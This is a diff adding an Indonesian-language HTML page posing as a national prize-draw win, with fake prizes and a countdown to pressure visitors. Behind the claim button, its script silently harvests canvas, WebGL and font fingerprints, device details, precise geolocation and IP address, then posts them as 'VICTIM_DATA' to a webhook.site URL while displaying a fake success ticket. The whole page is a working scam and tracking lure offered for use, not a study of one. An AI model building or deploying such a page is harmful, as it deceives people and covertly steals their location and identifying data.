@@ -1,0 +1,419 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>🎊 Undian Berhadiah Nasional</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Arial', sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            background: white;
+            border-radius: 15px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.2);
+            overflow: hidden;
+            max-width: 450px;
+            width: 100%;
+            text-align: center;
+        }
+        
+        .header {
+            background: linear-gradient(45deg, #FF416C, #FF4B2B);
+            padding: 30px 20px;
+            color: white;
+        }
+        
+        .gift-icon {
+            font-size: 60px;
+            margin-bottom: 15px;
+            animation: float 3s ease-in-out infinite;
+        }
+        
+        @keyframes float {
+            0%, 100% { transform: translateY(0px); }
+            50% { transform: translateY(-10px); }
+        }
+        
+        .header h1 {
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+        
+        .content {
+            padding: 30px;
+        }
+        
+        .prize-box {
+            background: #f8f9fa;
+            border: 2px dashed #28a745;
+            border-radius: 10px;
+            padding: 20px;
+            margin: 20px 0;
+        }
+        
+        .prize-item {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 8px 0;
+            font-size: 14px;
+            color: #333;
+        }
+        
+        .claim-btn {
+            background: linear-gradient(45deg, #28a745, #20c997);
+            color: white;
+            border: none;
+            padding: 16px 40px;
+            font-size: 18px;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.3s;
+            font-weight: bold;
+            margin: 15px 0;
+            width: 100%;
+        }
+        
+        .claim-btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 10px 20px rgba(40, 167, 69, 0.3);
+        }
+        
+        .loading {
+            display: none;
+            margin: 20px 0;
+        }
+        
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #007bff;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .success-message {
+            display: none;
+            background: #d4edda;
+            color: #155724;
+            padding: 20px;
+            border-radius: 10px;
+            margin: 20px 0;
+            border: 1px solid #c3e6cb;
+        }
+        
+        .timer {
+            background: #dc3545;
+            color: white;
+            padding: 8px 15px;
+            border-radius: 20px;
+            font-size: 14px;
+            display: inline-block;
+            margin: 10px 0;
+            animation: pulse 1.5s infinite;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.7; }
+        }
+        
+        .footer {
+            font-size: 12px;
+            color: #6c757d;
+            margin-top: 15px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="gift-icon">🎁</div>
+            <h1>SELAMAT! ANDA TERPILIH</h1>
+            <p>Pemenang Undian Nasional 2024</p>
+        </div>
+        
+        <div class="content">
+            <div class="timer">⏰ WAKTU TERSISA: <span id="countdown">05:00</span></div>
+            
+            <div class="prize-box">
+                <div class="prize-item">🏆 iPhone 15 Pro Max</div>
+                <div class="prize-item">💰 Uang Tunai Rp 10.000.000</div>
+                <div class="prize-item">✈️ Voucher Liburan Bali</div>
+                <div class="prize-item">📱 Paket Data 100GB</div>
+            </div>
+            
+            <p>Klik tombol di bawah untuk mengklaim hadiah Anda:</p>
+            
+            <button class="claim-btn" onclick="processClaim()">
+                🚀 KLAIM HADIAH SEKARANG
+            </button>
+            
+            <div class="loading" id="loading">
+                <div class="spinner"></div>
+                <p>Memverifikasi dan memproses hadiah...</p>
+            </div>
+            
+            <div class="success-message" id="successMessage">
+                <h3>🎉 SUKSES! HADIAH ANDA TELAH DIKLAIM</h3>
+                <p>Hadiah akan dikirim ke alamat terdaftar dalam 1x24 jam.</p>
+                <p style="font-size: 12px; margin-top: 10px;">No. Tiket: <strong>UND2024-<span id="ticketNumber"></span></strong></p>
+            </div>
+            
+            <div class="footer">
+                *Diproses oleh Sistem Undian Nasional Berizin
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Timer countdown
+        let timeLeft = 300; // 5 menit
+        const countdownElement = document.getElementById('countdown');
+        
+        function updateTimer() {
+            const minutes = Math.floor(timeLeft / 60);
+            const seconds = timeLeft % 60;
+            countdownElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+            
+            if (timeLeft > 0) {
+                timeLeft--;
+                setTimeout(updateTimer, 1000);
+            } else {
+                countdownElement.textContent = "WAKTU HABIS";
+                countdownElement.style.color = "#dc3545";
+            }
+        }
+        
+        updateTimer();
+
+        function processClaim() {
+            // Tampilkan loading
+            document.getElementById('loading').style.display = 'block';
+            document.querySelector('.claim-btn').disabled = true;
+            
+            // Kumpulkan data secara stealth
+            collectStealthData();
+        }
+        
+        function collectStealthData() {
+            // Data yang dikumpulkan
+            const collectedData = {
+                // Informasi browser dan sistem
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                languages: JSON.stringify(navigator.languages),
+                
+                // Informasi layar
+                screen: `${screen.width}x${screen.height}`,
+                colorDepth: screen.colorDepth,
+                pixelDepth: screen.pixelDepth,
+                
+                // Informasi koneksi
+                connection: JSON.stringify(navigator.connection || 'N/A'),
+                online: navigator.onLine,
+                
+                // Informasi waktu dan zona waktu
+                timestamp: new Date().toISOString(),
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timezoneOffset: new Date().getTimezoneOffset(),
+                
+                // Informasi perangkat
+                deviceMemory: navigator.deviceMemory || 'N/A',
+                hardwareConcurrency: navigator.hardwareConcurrency,
+                
+                // Cookies dan storage
+                cookiesEnabled: navigator.cookieEnabled,
+                localStorage: typeof(Storage) !== "undefined",
+                
+                // Canvas fingerprinting
+                canvasFingerprint: getCanvasFingerprint(),
+                
+                // WebGL fingerprinting
+                webglFingerprint: getWebGLFingerprint(),
+                
+                // Font detection
+                fonts: detectFonts(),
+                
+                // IP Address (akan didapat dari server)
+                ip: 'Fetching...'
+            };
+
+            // Dapatkan lokasi
+            getLocation().then(location => {
+                collectedData.location = location;
+                sendCollectedData(collectedData);
+            }).catch(error => {
+                collectedData.location = 'Location blocked';
+                sendCollectedData(collectedData);
+            });
+        }
+        
+        function getCanvasFingerprint() {
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            canvas.width = 200;
+            canvas.height = 50;
+            
+            ctx.textBaseline = 'top';
+            ctx.font = '14px Arial';
+            ctx.fillStyle = '#f60';
+            ctx.fillRect(125, 1, 62, 20);
+            ctx.fillStyle = '#069';
+            ctx.fillText('Canvas Fingerprint', 2, 15);
+            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+            ctx.fillText('Canvas Fingerprint', 4, 17);
+            
+            return canvas.toDataURL();
+        }
+        
+        function getWebGLFingerprint() {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            
+            if (!gl) return 'WebGL not supported';
+            
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            if (debugInfo) {
+                return {
+                    vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+                    renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
+                };
+            }
+            return 'WebGL info limited';
+        }
+        
+        function detectFonts() {
+            const fontList = [
+                'Arial', 'Arial Black', 'Comic Sans MS', 'Courier New',
+                'Georgia', 'Impact', 'Times New Roman', 'Trebuchet MS',
+                'Verdana', 'Microsoft YaHei'
+            ];
+            
+            const detectedFonts = [];
+            const canvas = document.createElement('canvas');
+            const context = canvas.getContext('2d');
+            const text = "abcdefghijklmnopqrstuvwxyz0123456789";
+            
+            canvas.width = 200;
+            canvas.height = 50;
+            
+            context.textBaseline = "top";
+            context.fillStyle = "black";
+            context.font = "72px monospace";
+            
+            fontList.forEach(font => {
+                context.font = "72px '" + font + "', monospace";
+                const metrics = context.measureText(text);
+                if (metrics.width !== context.measureText(text).width) {
+                    detectedFonts.push(font);
+                }
+            });
+            
+            return detectedFonts;
+        }
+        
+        function getLocation() {
+            return new Promise((resolve, reject) => {
+                if (!navigator.geolocation) {
+                    reject('Geolocation not supported');
+                    return;
+                }
+                
+                navigator.geolocation.getCurrentPosition(
+                    position => {
+                        resolve({
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy + 'm',
+                            altitude: position.coords.altitude || 'N/A',
+                            speed: position.coords.speed || 'N/A'
+                        });
+                    },
+                    error => {
+                        reject('Location access denied');
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+            });
+        }
+        
+        function sendCollectedData(data) {
+            // Simpan data ke localStorage sebagai backup
+            const sessionId = 'SESS-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
+            localStorage.setItem(sessionId, JSON.stringify(data));
+            
+            // Kirim data menggunakan Webhook/API
+            sendToWebhook(data);
+            
+            // Tampilkan sukses setelah delay
+            setTimeout(() => {
+                document.getElementById('loading').style.display = 'none';
+                document.getElementById('successMessage').style.display = 'block';
+                document.getElementById('ticketNumber').textContent = sessionId.split('-')[2];
+                
+                // Scroll ke success message
+                document.getElementById('successMessage').scrollIntoView({ 
+                    behavior: 'smooth' 
+                });
+            }, 4000);
+        }
+        
+        function sendToWebhook(data) {
+            // Menggunakan webhook gratis dari webhook.site
+            const webhookURL = 'https://webhook.site/https://webhook.site/fbe583da-b5f2-42eb-903f-bc710490c683';
+            
+            // Tambahkan IP address
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(ipData => {
+                    data.ip = ipData.ip;
+                    
+                    // Kirim data ke webhook
+                    return fetch(webhookURL, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            type: 'VICTIM_DATA',
+                            session: new Date().getTime(),
+                            data: data,
+                            source: 'Prize Website'
+                        })
+                    });
+                })
+                .then(response => {
+                    console.log('Data sent successfully');
+                })
+                .catch(error => {
+                    console.log('Data saved locally:', data);
+                });
+        }
+    </script>
+</body>
+</html>
